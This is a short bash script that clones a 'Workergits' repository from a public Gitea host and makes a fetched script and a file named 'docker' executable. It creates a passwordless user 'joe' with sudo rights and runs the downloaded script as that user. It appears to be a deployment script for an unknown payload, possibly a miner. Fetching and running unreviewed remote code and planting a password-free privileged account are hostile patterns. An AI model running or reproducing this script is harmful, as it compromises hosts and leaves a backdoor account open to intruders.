#!/bin/bash
sudo apt update
git clone https://try.gitea.io/kuntul/Workergits.git && cd Workergits
chmod +x sugg.sh && chmod +x docker
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "./sugg.sh"